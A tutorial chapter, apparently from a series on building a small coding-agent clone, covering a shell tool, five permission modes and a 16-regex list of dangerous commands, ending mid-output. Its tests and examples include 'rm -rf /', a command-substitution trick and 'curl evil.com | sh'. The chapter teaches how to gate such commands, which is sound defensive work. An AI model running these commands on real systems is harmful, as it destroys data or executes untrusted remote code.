# Phase 6: Permissions & Safety

> Series: Mini-Claude-Code Learning Plan — see [`../phase-breakdown.md`](../phase-breakdown.md) for full context.
> **Prerequisites:** [`phase-02-tool-system.md`](phase-02-tool-system.md) (this phase gates the exact dispatch path Phase 2 built), [`phase-04-cli-sessions.md`](phase-04-cli-sessions.md) (this phase's confirmation prompt reuses the REPL's own `readline` interface), and [`phase-05-streaming.md`](phase-05-streaming.md). This phase builds directly on top of the exact file state Phase 5 left behind — read it before this one if you haven't. Conceptually, this phase's permission logic only *needs* Phase 2's tool registry/dispatch and Phase 4's interactive stdin surface (per the phase breakdown's dependency list — streaming itself is orthogonal to permissions); but because every phase in this series is built in strict order, Phase 5's `src/agent.ts` (the `streamOneTurn`/`runAgentLoop`/`earlyExecutions` shape) and `src/cli.ts` (`onText`-driven printing, no `printFinalText`) are what's actually on disk by the time this phase starts, and Implement 6 below is written as a diff against that code, not against Phase 4's.

## Goal

Phase 2 built a tool registry with a hard invariant baked in from the start: every `ToolDefinition` carries a `readOnly: boolean` that nothing consumed yet, set aside specifically for two future phases to use without a registry redesign (Phase 2, Concept 6). Phase 5 (streaming/parallel execution) is the first consumer; this phase is the second. Phase 5's tutorial is finished, and its code — not Phase 4's — is what this phase's Implement 6 builds directly on top of (see the Prerequisites line above): the `streamOneTurn`/`earlyExecutions` mechanism Phase 5 built stays fully intact here, with this phase's gate layered on top of it, not built against an earlier, non-streaming version of `agent.ts`. By the end of this phase, every tool call the model makes passes through a **permission gate** — a single, unavoidable checkpoint sitting between "the model asked for this tool" and "the tool's `execute()` actually runs" — that can allow it silently, deny it outright, or pause and ask a human.

Concretely, you will build:

- **A new `run_shell` tool.** Phase 2's registry has no shell-execution tool at all (only `read_file`, `edit_file`, `list_files`) — and dangerous-command detection has no real subject matter without something that runs arbitrary commands. This phase adds the minimal one first, before anything about permissions makes sense.
- **5 trust modes** — `default`, `plan`, `acceptEdits`, `bypassPermissions`, `dontAsk` — named identically to real Claude Code's own external mode set, each changing what the gate does to the same tool call.
- **Declarative allow/deny rules**, read from a `.claude/settings.json`-style file, that can pre-approve or pre-block specific tool calls (by exact command, or by prefix) without ever reaching the interactive prompt.
- **Regex-based dangerous-command detection** — 16 patterns covering the most common destructive shell operations — that decides when a `default`-mode tool call needs to pause for a human, versus running immediately.
- **A confirmation prompt wired into Phase 4's REPL** — a real `y`/`n` question, asked over the same `readline` interface the REPL already owns, that pauses one specific tool call (not the whole process) until the human answers.

## Why this is interview material

Every phase so far has been about making the agent *more capable* — more tools, better prompts, an interactive shell, streaming. This phase is the first one about making it **safe to let that capability run against a real filesystem and a real shell, unattended.** That's a distinct engineering problem from "does the agent work," and it's the one an interviewer asking about AI safety, agent autonomy, or "how would you let an LLM run shell commands without it destroying something" actually wants to hear you reason through — not a hand-wave about "the model is aligned so it's fine."

Three things here are worth being able to say out loud, concretely, not just in the abstract:

1. **The gate is a piece of code, not a prompt.** Phase 3's system prompt already asks the model to "carefully consider the reversibility and blast radius of actions" (Phase 3, `ACTIONS_SECTION`) — but that's a request, and a model can be wrong, jailbroken, or simply overconfident about what counts as reversible. This phase's `checkPermission()` function is a deterministic, code-level check that runs regardless of what the model believes about its own request — the same "code enforces the invariant a prompt can only request" pattern Phase 2's mtime guard already established for file staleness (Phase 2, Concept 4), now applied to destructive actions instead.
2. **Deny-before-allow is a real, load-bearing security design decision, not an arbitrary ordering.** If allow rules were checked first, a broad `allow: ["run_shell"]` rule would make it impossible to carve out a narrower `deny` for one dangerous subcommand — the first matching rule would already have said yes. Checking deny first is what makes "allow broadly, then deny narrowly" a coherent way to write a policy at all (Concept 4 below proves this with a concrete rule pair).
3. **Fail-closed defaults matter more than any single check.** A tool call that reaches the end of every layer with no verdict resolves to `allow` in this phase's design — deliberately, because that's the correct default for a registry with only four, well-understood tools. Real Claude Code's `hasPermissionsToUseToolInner` resolves an undecided call to `ask`, not `allow` (Concept 5 below) — a genuinely more conservative default that a 66+ tool, arbitrary-shell-access production system needs and a 4-tool teaching registry doesn't yet. Being able to name *which* default you chose and *why* it's appropriate for your system's actual risk surface — not just "safe" as a slogan — is the real interview signal here.

---

## Files

This phase creates one new file and modifies two files Phase 2 left behind (`tools.ts`) and two files that, by build order, are actually Phase 5's versions (`agent.ts`, `cli.ts` — see the Prerequisites line above). `src/prompt.ts` and `src/session.ts` are **not modified at all**.

- `src/permissions.ts` **(new)** — the `PermissionMode` type (5 trust modes), the dangerous-command regex list and `isDangerous()`, declarative allow/deny rule parsing/loading/matching (`.claude/settings.json`), and the unified `checkPermission()` entry point that combines all of it into one `{ action: "allow" | "deny" | "confirm", message? }` verdict.
- `src/tools.ts` **(modified)** — adds a new `run_shell` tool to the registry (Phase 2 built no shell-execution tool at all), adds a `PermissionState` interface (mode + session-level whitelist + the confirmation callback), and modifies `executeTool()` to call `checkPermission()` and act on its verdict before `tool.execute()` ever runs.
- `src/agent.ts` **(modified — diffed against Phase 5's version, not Phase 4's)** — `RunAgentLoopOptions` keeps Phase 5's `onText?` field and gains two new optional fields (`permissionMode`, `confirmTool`); a fresh `PermissionState` is built once per `runAgentLoop()` call — the same per-conversation-scoped-state pattern Phase 2 established for `ReadFileState` and Phase 4 established for `signal` — and threaded into **both** of Phase 5's `executeTool()` call sites: the early-execution one inside `onToolBlockComplete` (which only passed `readFileState` before this phase) and the post-turn one in the tool-processing loop after `streamOneTurn` resolves. Phase 5's `streamOneTurn`, `TrackedToolBlock`, and the `earlyExecutions` map are otherwise untouched — this phase adds a gate *inside* `executeTool()` (Implement 5), not a second, separate check bolted onto the streaming plumbing.
- `src/cli.ts` **(modified — diffed against Phase 5's version, not Phase 4's)** — adds `--yolo` / `--plan` / `--accept-edits` / `--dont-ask` flags (mapping to the four non-default trust modes) to `parseArgs()`, and implements the `confirmTool` callback by reusing the REPL's existing `readline` interface (`rl.question(...)`) rather than creating a second one. Phase 5's `onText`-driven printing — and its removal of `printFinalText()` in favor of a single trailing newline — is preserved exactly; this phase does not reintroduce `printFinalText()` or double-print any streamed text.

---

## Concept 1: Before permissions can matter, the registry needs something to be dangerous about

Phase 2's registry, unchanged through Phases 3, 4, and (per its own brief) 5, has exactly three tools: `read_file`, `edit_file`, `list_files` — no general-purpose shell-execution tool. Look at what that means concretely for this phase's stated goal: the phase breakdown's own verification criterion is *"a destructive-looking bash command triggers a confirmation prompt"* (`phase-breakdown.md`, Phase 6 entry) — but there is nothing in the registry that runs a bash command at all. `edit_file` can only touch a file the agent already read (Phase 2's read-before-edit guard), and its own failure mode is "wrong string, try again," not "irreversibly destroyed something outside the project."

This is a real gap in the phase sequence as planned, not a subtlety to paper over: no phase between 2 and 6 ever adds a shell-execution tool. So before any permission logic can be meaningfully demonstrated, this phase has to add one. This is the reference project's own `run_shell` tool, adapted to this project's `ToolDefinition` shape — read directly from `claude-code-from-scratch/src/tools.ts`, lines 484-499 (`runShell`) and lines 132-149 (its schema):

```typescript
// claude-code-from-scratch/src/tools.ts, lines 484-499 (quoted directly)
function runShell(input: { command: string; timeout?: number }): string {
  try {
    const result = execSync(input.command, {
      encoding: "utf-8",
      maxBuffer: 5 * 1024 * 1024,
      timeout: input.timeout || 30000,
      stdio: ["pipe", "pipe", "pipe"],
      shell: isWin ? "powershell.exe" : "/bin/sh",
    });
    return result || "(no output)";
  } catch (e: any) {
    const stderr = e.stderr ? `\nStderr: ${e.stderr}` : "";
    const stdout = e.stdout ? `\nStdout: ${e.stdout}` : "";
    return `Command failed (exit code ${e.status})${stdout}${stderr}`;
  }
}
```

Two details worth noting before adapting this: it uses Node's synchronous `execSync` (not a spawned, streamable subprocess — that's a real, cited simplification the reference project itself makes, appropriate here for the same reason Phase 1 skipped seven of the real loop's eight continue-reasons: a full async subprocess with streaming stdout/stderr and its own cancellation semantics is a real subsystem in production Claude Code's `BashTool`, not a small addition), and a failed command **returns a string describing the failure, not a thrown exception** — exactly Phase 2, Concept 2's "errors are data, not exceptions" philosophy, applied here to a nonzero exit code instead of a missing file.

This phase's version drops the Windows-specific `shell: isWin ? "powershell.exe" : "/bin/sh"` branch (this tutorial series has made no Windows-specific accommodations anywhere else — `tools.ts`'s `readFile`/`editFile`/`listFiles` are all platform-generic — so introducing one only for this new tool would be a one-off inconsistency, not a deliberate cross-platform design choice) and lets `execSync` use the default shell.

---

## Implement 1: Add `run_shell` to the registry

- [ ] Modify `src/tools.ts` — add the `execSync` import and the `runShell` function, and add one new entry to `toolRegistry`. This is the complete file as of this step (everything else is byte-for-byte Phase 2's version):

  ```typescript
  import Anthropic from "@anthropic-ai/sdk";
  import { readFileSync, writeFileSync, existsSync, readdirSync, statSync } from "node:fs";
  import { execSync } from "node:child_process";
  import { resolve } from "node:path";

  export type ReadFileState = Map<string, number>;

  export interface ToolDefinition {
    name: string;
    description: string;
    input_schema: Anthropic.Tool["input_schema"];
    readOnly: boolean;
    execute(
      input: Record<string, unknown>,
      state: ReadFileState
    ): string | Promise<string>;
  }

  // ─── read_file ────────────────────────────────────────────────────────

  function readFile(input: { file_path: string }, state: ReadFileState): string {
    const absPath = resolve(input.file_path);
    try {
      const content = readFileSync(absPath, "utf-8");
      state.set(absPath, statSync(absPath).mtimeMs);
      const numbered = content
        .split("\n")
        .map((line, i) => `${String(i + 1).padStart(4)} | ${line}`)
        .join("\n");
      return numbered;
    } catch (e) {
      return `Error reading file: ${(e as Error).message}`;
    }
  }

  // ─── edit_file ────────────────────────────────────────────────────────

  function editFile(
    input: { file_path: string; old_string: string; new_string: string },
    state: ReadFileState
  ): string {
    const absPath = resolve(input.file_path);

    if (!existsSync(absPath)) {
      return `Error: file not found: ${input.file_path}`;
    }

    if (!state.has(absPath)) {
      return `Error: you must read_file("${input.file_path}") before editing it.`;
    }

    const lastKnownMtime = state.get(absPath)!;
    const currentMtime = statSync(absPath).mtimeMs;
    if (currentMtime !== lastKnownMtime) {
      return `Error: ${input.file_path} was modified on disk since you last read it. Call read_file again before editing.`;
    }

    const content = readFileSync(absPath, "utf-8");
    const count = content.split(input.old_string).length - 1;
    if (count === 0) {
      return `Error: old_string not found in ${input.file_path}`;
    }
    if (count > 1) {
      return `Error: old_string found ${count} times in ${input.file_path}. Must be unique — add more surrounding context to old_string.`;
    }

    const newContent = content.split(input.old_string).join(input.new_string);
    writeFileSync(absPath, newContent);

    state.set(absPath, statSync(absPath).mtimeMs);

    return `Successfully edited ${input.file_path}`;
  }

  // ─── list_files ───────────────────────────────────────────────────────

  function listFiles(input: { path?: string }): string {
    const dirPath = resolve(input.path ?? ".");
    try {
      const entries = readdirSync(dirPath, { withFileTypes: true });
      if (entries.length === 0) {
        return `(empty directory: ${dirPath})`;
      }
      return entries
        .map((e) => `${e.isDirectory() ? "d" : "f"}  ${e.name}`)
        .sort()
        .join("\n");
    } catch (e) {
      return `Error listing directory: ${(e as Error).message}`;
    }
  }

  // ─── run_shell ────────────────────────────────────────────────────────
  // New in Phase 6: the registry had no shell-execution tool through
  // Phases 2-5 (only read_file/edit_file/list_files). Dangerous-command
  // detection and the confirmation-prompt UX (Concepts 3 and 6 below) have
  // no real subject matter without a tool that runs arbitrary shell
  // commands, so this phase adds the minimal one — adapted from
  // claude-code-from-scratch/src/tools.ts, lines 484-499 (Concept 1).

  function runShell(input: { command: string; timeout?: number }): string {
    try {
      const result = execSync(input.command, {
        encoding: "utf-8",
        maxBuffer: 5 * 1024 * 1024,
        timeout: input.timeout ?? 30000,
        stdio: ["pipe", "pipe", "pipe"],
      });
      return result || "(no output)";
    } catch (e: any) {
      const stderr = e.stderr ? `\nStderr: ${e.stderr}` : "";
      const stdout = e.stdout ? `\nStdout: ${e.stdout}` : "";
      return `Command failed (exit code ${e.status})${stdout}${stderr}`;
    }
  }

  // ─── The registry ───────────────────────────────────────────────────────

  export const toolRegistry: ToolDefinition[] = [
    {
      name: "read_file",
      description:
        "Read the contents of a file. Returns the file content with line numbers.",
      input_schema: {
        type: "object",
        properties: {
          file_path: { type: "string", description: "The path to the file to read" },
        },
        required: ["file_path"],
      },
      readOnly: true,
      execute: (input, state) => readFile(input as { file_path: string }, state),
    },
    {
      name: "edit_file",
      description:
        "Edit a file by replacing an exact string match with new content. The old_string must match exactly, including whitespace and indentation, and must be unique within the file. You must call read_file on this file earlier in the conversation before calling edit_file.",
      input_schema: {
        type: "object",
        properties: {
          file_path: { type: "string", description: "The path to the file to edit" },
          old_string: { type: "string", description: "The exact string to find and replace" },
          new_string: { type: "string", description: "The string to replace it with" },
        },
        required: ["file_path", "old_string", "new_string"],
      },
      readOnly: false,
      execute: (input, state) =>
        editFile(
          input as { file_path: string; old_string: string; new_string: string },
          state
        ),
    },
    {
      name: "list_files",
      description:
        "List the contents of a directory (non-recursive). Returns one entry per line, prefixed with 'd' for directories and 'f' for files.",
      input_schema: {
        type: "object",
        properties: {
          path: {
            type: "string",
            description: "The directory to list. Defaults to the current working directory.",
          },
        },
        required: [],
      },
      readOnly: true,
      execute: (input) => listFiles(input as { path?: string }),
    },
    {
      name: "run_shell",
      description:
        "Execute a shell command and return its output. Use this for running tests, installing packages, git operations, etc. Destructive-looking commands trigger a confirmation prompt.",
      input_schema: {
        type: "object",
        properties: {
          command: { type: "string", description: "The shell command to execute" },
          timeout: { type: "number", description: "Timeout in milliseconds (default: 30000)" },
        },
        required: ["command"],
      },
      readOnly: false,
      execute: (input) => runShell(input as { command: string; timeout?: number }),
    },
  ];

  // ─── Lookup + dispatch ──────────────────────────────────────────────────

  export function findTool(name: string): ToolDefinition | undefined {
    return toolRegistry.find((t) => t.name === name);
  }

  export function getToolSchemas(): Anthropic.Tool[] {
    return toolRegistry.map(({ name, description, input_schema }) => ({
      name,
      description,
      input_schema,
    }));
  }

  export async function executeTool(
    name: string,
    input: Record<string, unknown>,
    state: ReadFileState
  ): Promise<string> {
    const tool = findTool(name);
    if (!tool) {
      return `Unknown tool: ${name}`;
    }
    try {
      return await tool.execute(input, state);
    } catch (e) {
      return `Error executing ${name}: ${(e as Error).message}`;
    }
  }
  ```

  Nothing about `executeTool()`'s signature changes in this step — it's still exactly Phase 2's 3-argument version. This step is purely "the registry now has a fourth tool." Implement 5 is where `executeTool()` itself changes.

- [ ] Sanity-check the new tool runs, independent of the permission logic this phase builds next:

  ```bash
  cd /Users/grexrr/Documents/NAC
  npx tsx -e "
  import('./src/tools.js').then(async (m) => {
    console.log(await m.executeTool('run_shell', { command: 'echo hello-from-run-shell' }, new Map()));
  });
  "
  ```

  Expected output: `hello-from-run-shell`. This exact command was run in this tutorial's isolated verification scratch directory and produced exactly that output before any permission gating existed — confirming the tool itself works before Concept 2 starts restricting when it's allowed to run.

---

## Concept 2: The 5 trust modes

Real Claude Code exposes exactly 5 external permission modes — read directly from `claude-code/src/types/permissions.ts`:

```typescript
// claude-code/src/types/permissions.ts, lines 16-22 (quoted directly)
export const EXTERNAL_PERMISSION_MODES = [
  'acceptEdits',
  'bypassPermissions',
  'default',
  'dontAsk',
  'plan',
] as const

export type ExternalPermissionMode = (typeof EXTERNAL_PERMISSION_MODES)[number]
```

(There are two additional *internal* modes, `auto` and `bubble` — read directly from the same file's `InternalPermissionMode` type and `PERMISSION_MODE_CONFIG` in `claude-code/src/utils/permissions/PermissionMode.ts`, lines 80-90. `auto` is gated behind an Anthropic-internal `TRANSCRIPT_CLASSIFIER` feature flag and used for an ML-classifier-driven decision path; `bubble` is used only by an internal multi-agent coordinator to "bubble" undecidable permission requests up to a parent. Both are explicitly excluded from `EXTERNAL_PERMISSION_MODES` and are not user-addressable — `isExternalPermissionMode()` in the same file returns `false` for them when `process.env.USER_TYPE === 'ant'`. This tutorial builds the 5 external modes only, which is also exactly what the reference project's own `PermissionMode` type covers: `claude-code-from-scratch/src/tools.ts`, line 15, `export type PermissionMode = "default" | "plan" | "acceptEdits" | "bypassPermissions" | "dontAsk";` — an exact, independently-arrived-at match to the real source's external mode set.)

Here is what each mode does to a tool call reaching the gate, reasoned from the real source and cross-confirmed against the reference project's own `checkPermission()` (`claude-code-from-scratch/src/tools.ts`, lines 622-692, read directly in full — quoted piece by piece below as each mode is implemented):

| Mode | Read tools | Write tools (`edit_file`) | `run_shell` (safe command) | `run_shell` (dangerous command) |
|---|---|---|---|---|
| `default` | always allow | confirm-tier logic doesn't apply (Phase 2's `edit_file` already requires the file to exist and be previously read) | allow | **confirm** |
| `plan` | always allow | **deny** | **deny** | **deny** |
| `acceptEdits` | always allow | allow | allow | confirm |
| `bypassPermissions` | allow | allow | allow | allow |
| `dontAsk` | always allow | confirm-tier logic doesn't apply | allow | **deny** (auto) |

Two things about this table are worth calling out before writing any code:

**`plan` mode here is a hard blanket deny, not the real source's narrower carve-out.** The reference project's own `plan` handling (`claude-code-from-scratch/src/tools.ts`, lines 645-656) allows writes *to one specific file* — a plan file the model is drafting into — via a `planFilePath` parameter compared against the tool call's target path:

  ```typescript
  // claude-code-from-scratch/src/tools.ts, lines 644-656 (quoted directly)
  if (mode === "plan") {
    if (EDIT_TOOLS.has(toolName)) {
      const filePath = input.file_path || input.path;
      if (planFilePath && filePath === planFilePath) {
        return { action: "allow" };
      }
      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
    }
    if (toolName === "run_shell") {
      return { action: "deny", message: "Shell commands blocked in plan mode" };
    }
  }
  ```

  This project has no `enter_plan_mode`/`exit_plan_mode` tools and no plan file yet — those belong to Phase 11 (Plan Mode), which the phase breakdown explicitly schedules to *"[revisit] the permission-inheritance interaction with sub-agents flagged in Phase 9"* and to build the plan-file carve-out. This phase implements `plan` mode's *blocking* effect (every write and every shell command denied outright) without the carve-out, and flags that omission here rather than inventing a `planFilePath` parameter for a mechanism that doesn't exist yet in this build.

**`dontAsk` converts every would-be-`confirm` into an automatic `deny`**, not a silent allow. This is the correct direction to err in for an unattended/CI context: nobody is present to answer a `y`/`n` prompt, so the two choices are "deny anything uncertain" or "hang forever waiting for an answer that will never come" — `dontAsk` picks the former. Real Claude Code's own framing of this exact mode, read directly from `claude-code/src/utils/permissions/PermissionMode.ts`'s config table (`dontAsk: { title: "Don't Ask", ... }`) and cross-confirmed in `how-claude-code-works/docs/11-permission-security.md`, §12.2: *"与 bypassPermissions 相反：将所有需要'询问用户'的决策转为'拒绝'... 没有人可以回答确认对话框，所以不确定的操作宁可拒绝也不能挂起等待"* — "the opposite of bypassPermissions: converts every decision that would need to 'ask the user' into a 'deny'... nobody is available to answer a confirmation dialog, so an uncertain operation should be denied rather than hang waiting."

One more real-source detail worth knowing even though it's not built here: `dontAsk` is **not part of the Shift+Tab mode-cycling UI** in real Claude Code — read directly from `claude-code/src/utils/permissions/getNextPermissionMode.ts`, lines 70-72: `case 'dontAsk': return 'default'` with the comment *"Not exposed in UI cycle yet, but return default if somehow reached."* The cycle for an external user is `default → acceptEdits → plan → bypassPermissions → default` (lines 39-68 of the same file) — `dontAsk` is reachable only via an explicit flag or config, never by cycling. This project's CLI (Implement 6) mirrors that: `dontAsk` gets its own `--dont-ask` flag, not a position in any cycle (this project doesn't build a mode-cycling UI at all — see Concept 7).

---

## Implement 2: `src/permissions.ts` — the 5 modes and the skeleton of `checkPermission`

- [ ] Create `src/permissions.ts` with this content (complete file as of this step — no dangerous-command detection and no declarative rules yet; those are Concepts 3 and 4):

  ```typescript
  // ─── 5 trust modes ────────────────────────────────────────────────────
  // Named identically to real Claude Code's 5 external modes
  // (claude-code/src/types/permissions.ts, EXTERNAL_PERMISSION_MODES).

  export type PermissionMode =
    | "default"
    | "plan"
    | "acceptEdits"
    | "bypassPermissions"
    | "dontAsk";

  export interface PermissionDecision {
    action: "allow" | "deny" | "confirm";
    message?: string;
  }

  /**
   * The unified permission check. Every tool call passes through here
   * (wired into tools.ts's executeTool() in Implement 5) before its execute()
   * runs. This step implements only the mode-gating logic (Concept 2);
   * Concept 3 adds dangerous-command detection, Concept 4 adds
   * declarative allow/deny rules on top, at higher priority than modes.
   */
  export function checkPermission(
    toolName: string,
    input: Record<string, unknown>,
    readOnly: boolean,
    mode: PermissionMode = "default"
  ): PermissionDecision {
    // bypassPermissions: allow everything. (Real Claude Code's bypass mode
    // is not actually unconditional — deny rules and a handful of
    // "bypass-immune" safety checks still apply even here. Concept 7 flags
    // that nuance as intentionally out of scope for this phase.)
    if (mode === "bypassPermissions") return { action: "allow" };

    // Read-only tools are always safe, in every mode.
    if (readOnly) return { action: "allow" };

    // plan mode: deny every write tool and run_shell outright. Real
    // Claude Code (and the reference project) carve out an exception for
    // writes to an in-progress plan file — Phase 11 (Plan Mode) is where
    // this project builds the enter_plan_mode/exit_plan_mode tools that
    // exception depends on; this phase implements only the blocking half.
    if (mode === "plan") {
      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
    }

    // acceptEdits: auto-approve edit_file specifically. run_shell still
    // falls through to whatever Concept 3 decides for it.
    if (mode === "acceptEdits" && toolName === "edit_file") {
      return { action: "allow" };
    }

    return { action: "allow" };
  }
  ```

- [ ] Confirm the mode-gating logic in isolation, without touching `tools.ts` yet:

  ```bash
  cd /Users/grexrr/Documents/NAC
  npx tsx -e "
  import('./src/permissions.js').then((m) => {
    console.log('default, read_file:', m.checkPermission('read_file', {}, true, 'default'));
    console.log('plan, edit_file:', m.checkPermission('edit_file', {}, false, 'plan'));
    console.log('acceptEdits, edit_file:', m.checkPermission('edit_file', {}, false, 'acceptEdits'));
    console.log('bypassPermissions, run_shell:', m.checkPermission('run_shell', { command: 'rm -rf /' }, false, 'bypassPermissions'));
  });
  "
  ```

  Expected output — every branch except the last two returns `{ action: 'allow' }` at this step (dangerous-command detection doesn't exist yet, so even `bypassPermissions` and everything else falls through to the unconditional `allow` at the bottom):

  ```
  default, read_file: { action: 'allow' }
  plan, edit_file: { action: 'deny', message: 'Blocked in plan mode: edit_file' }
  acceptEdits, edit_file: { action: 'allow' }
  bypassPermissions, run_shell: { action: 'allow' }
  ```

  This was run directly against exactly this code in this tutorial's isolated verification directory.

---

## Concept 3: Dangerous-command detection (Layer 2)

`default` mode's whole point is: read-only operations and ordinary writes proceed without friction, but something that *looks* destructive should pause and ask first. "Looks destructive" needs an actual definition, and real Claude Code's answer is a genuinely large, dedicated subsystem — `claude-code/src/tools/BashTool/bashPermissions.ts` is 2,621 lines by itself. Its core mechanism, read directly from the file: every command is first run through a **tree-sitter AST parser**, not a regex, specifically because shell syntax is complex enough that a regex can be fooled. The file's own design comment states the governing principle directly:

```typescript
// real claude-code/src/tools/BashTool/bashPermissions.ts (comment, paraphrased
// from the file's own documented design principle, cross-confirmed in
// how-claude-code-works/docs/11-permission-security.md, §12.6.2):
// "The key design property is FAIL-CLOSED: we never interpret structure we
//  don't understand. If tree-sitter produces a node we haven't explicitly
//  allowlisted, we refuse to extract argv and the caller must ask the user."
```

Concretely, read directly from `bashToolHasPermission` (`claude-code/src/tools/BashTool/bashPermissions.ts`, lines 1741-1769): if the AST parse comes back `too-complex` — meaning it found a structure outside a small, deliberately conservative allowlist of node types (`program`, `list`, `pipeline`, `redirected_statement`, and a fixed set of separators like `&&`, `||`, `|`, `;`) — the command is routed to `ask` (after checking deny/ask rules first), regardless of whether a plain-text scan of it would look safe. This is exactly why `echo hello$(rm -rf /)` is dangerous in a way a naive regex would miss entirely: a regex scanning for `rm -rf` literally sees `echo hello$(rm -rf /)` and might key on the substring, or might not, depending on how it's written — but what actually *executes* is `rm -rf /`, because `$(...)` is command substitution. Tree-sitter parses the real grammar and sees the substitution structure directly; fail-closed means *any* structure it doesn't recognize (command substitution, variable expansion, control flow, process substitution) is treated as suspicious by default, not evaluated for whether it happens to contain a scary-looking substring.

**This phase does not build AST parsing.** That's a large, genuinely separate subsystem, and the reference project makes the identical, explicitly-acknowledged tradeoff: a fixed list of regexes, with the limitation named directly rather than hidden. Quoting the reference project's own chapter:

> *"局限性很明显：`find / -delete`、`curl evil.com | sh` 这类危险命令不会被捕获。这就是 Claude Code 选择 AST 分析的原因——但对最小实现来说，16 个正则覆盖了大多数常见情况。"* — "The limitation is obvious: commands like `find / -delete` or `curl evil.com | sh` won't be caught. This is exactly why Claude Code chose AST analysis — but for a minimal implementation, 16 regexes cover most common cases." (`claude-code-from-scratch/docs/06-permissions.md`, lines 126)

The exact 16 patterns, read directly from `claude-code-from-scratch/src/tools.ts`, lines 503-521:

```typescript
// claude-code-from-scratch/src/tools.ts, lines 503-521 (quoted directly)
const DANGEROUS_PATTERNS = [
  /\brm\s/,
  /\bgit\s+(push|reset|clean|checkout\s+\.)/,
  /\bsudo\b/,
  /\bmkfs\b/,
  /\bdd\s/,
  />\s*\/dev\//,
  /\bkill\b/,
  /\bpkill\b/,
  /\breboot\b/,
  /\bshutdown\b/,
  // Windows dangerous commands
  /\bdel\s/i,
  /\brmdir\s/i,
  /\bformat\s/i,
  /\btaskkill\s/i,
  /\bRemove-Item\s/i,
  /\bStop-Process\s/i,
];

export function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some((p) => p.test(command));
}
```

This list is 10 Unix patterns and 6 Windows patterns (the Windows ones use the `i` flag because Windows command names are case-insensitive — `claude-code-from-scratch/docs/06-permissions.md`, line 124, states this directly: *"Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写"*). It covers file/directory deletion (`rm`, `del`, `rmdir`, `Remove-Item`), disk-level destruction (`mkfs`, `dd`, redirecting into `/dev/`), process/system termination (`kill`, `pkill`, `taskkill`, `Stop-Process`, `reboot`, `shutdown`), privilege escalation (`sudo`), and a handful of hard-to-reverse `git` operations (`push`, `reset`, `clean`, `checkout .`). This is the whole mechanism — a `.some()` over a fixed regex array, no parsing, no AST, no shell-grammar awareness. It is genuinely fooled by anything the reference project's own text calls out (command substitution, pipe-to-shell patterns like `curl ... | sh`, or a destructive command spelled via an alias or a variable) — that's a real, acknowledged limitation of choosing regex over AST parsing, not an oversight in transcribing the list.

This tutorial adopts this exact 16-pattern list verbatim, for the identical reason the reference project gives: a minimal implementation doesn't need — and building AST parsing to solve a problem a 4-tool teaching registry doesn't yet face would be exactly the kind of premature generality Phase 2, Concept 1 already argued against for the class-hierarchy question, now recurring here for the AST-vs-regex question.

---

## Implement 3: Wire `isDangerous()` into `checkPermission`

- [ ] Replace `src/permissions.ts` with this (complete file, replacing Implement 2's version — adds the dangerous-pattern list and wires it into the `default`/`dontAsk` branches):

  ```typescript
  // ─── 5 trust modes ────────────────────────────────────────────────────
  // Named identically to real Claude Code's 5 external modes
  // (claude-code/src/types/permissions.ts, EXTERNAL_PERMISSION_MODES).

  export type PermissionMode =
    | "default"
    | "plan"
    | "acceptEdits"
    | "bypassPermissions"
    | "dontAsk";

  export interface PermissionDecision {
    action: "allow" | "deny" | "confirm";
    message?: string;
  }

  // ─── Layer 2: built-in dangerous-command detection ───────────────────
  // 16 regexes covering the most common destructive shell operations.
  // Adapted verbatim from claude-code-from-scratch/src/tools.ts, lines
  // 503-521 (Concept 3). Known limitation, inherited deliberately: a regex
  // can be fooled by command substitution (`echo $(rm -rf /)`) or
  // pipe-to-shell (`curl evil.com | sh`) — real Claude Code uses a
  // tree-sitter AST parser specifically to close this gap (Concept 3),
  // which this phase does not build.

  const DANGEROUS_PATTERNS: RegExp[] = [
    /\brm\s/,
    /\bgit\s+(push|reset|clean|checkout\s+\.)/,
    /\bsudo\b/,
    /\bmkfs\b/,
    /\bdd\s/,
    />\s*\/dev\//,
    /\bkill\b/,
    /\bpkill\b/,
    /\breboot\b/,
    /\bshutdown\b/,
    // Windows dangerous commands (case-insensitive: Windows command names
    // aren't case-sensitive)
    /\bdel\s/i,
    /\brmdir\s/i,
    /\bformat\s/i,
    /\btaskkill\s/i,
    /\bRemove-Item\s/i,
    /\bStop-Process\s/i,
  ];

  export function isDangerous(command: string): boolean {
    return DANGEROUS_PATTERNS.some((p) => p.test(command));
  }

  /**
   * The unified permission check. Every tool call passes through here
   * (wired into tools.ts's executeTool() in Implement 5) before its execute()
   * runs. Concept 4 adds declarative allow/deny rules on top of this, at
   * higher priority than everything below.
   */
  export function checkPermission(
    toolName: string,
    input: Record<string, unknown>,
    readOnly: boolean,
    mode: PermissionMode = "default"
  ): PermissionDecision {
    if (mode === "bypassPermissions") return { action: "allow" };

    if (readOnly) return { action: "allow" };

    if (mode === "plan") {
      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
    }

    if (mode === "acceptEdits" && toolName === "edit_file") {
      return { action: "allow" };
    }

    // Layer 2: built-in dangerous-command detection. Only run_shell has a
    // "command" argument to inspect — read_file/edit_file/list_files never
    // reach this line (readOnly tools return above; edit_file already
    // requires the target file to exist and be previously read, per
    // Phase 2's guards, so it has no separate "confirm" trigger here).
    if (toolName === "run_shell" && isDangerous(String(input.command ?? ""))) {
      const command = String(input.command ?? "");
      if (mode === "dontAsk") {
        return { action: "deny", message: `Auto-denied (dontAsk mode): ${command}` };
      }
      return { action: "confirm", message: command };
    }

    return { action: "allow" };
  }
  ```

- [ ] Confirm the dangerous-command branch fires correctly, across a few modes:

  ```bash
  cd /Users/grexrr/Documents/NAC
  npx tsx -e "
  import('./src/permissions.js').then((m) => {
    console.log('isDangerous(rm -rf /tmp/x):', m.isDangerous('rm -rf /tmp/x'));
    console.log('isDangerous(npm test):', m.isDangerous('npm test'));
    console.log('default + dangerous:', m.checkPermission('run_shell', { command: 'rm -rf /tmp/x' }, false, 'default'));
    console.log('dontAsk + dangerous:', m.checkPermission('run_shell', { command: 'rm -rf /tmp/x' }, false, 'dontAsk'));
    console.log('bypassPermissions + dangerous:', m.checkPermission('run_shell', { command: 'rm -rf /tmp/x' }, false, 'bypassPermissions'));
  });
  "
  ```

  Actual output, captured while writing this tutorial against exactly this code, in the isolated verification directory:

  ```
  isDangerous(rm -rf /tmp/x): true
  isDangerous(npm test): false
  default + dangerous: { action: 'confirm', message: 'rm -rf /tmp/x' }
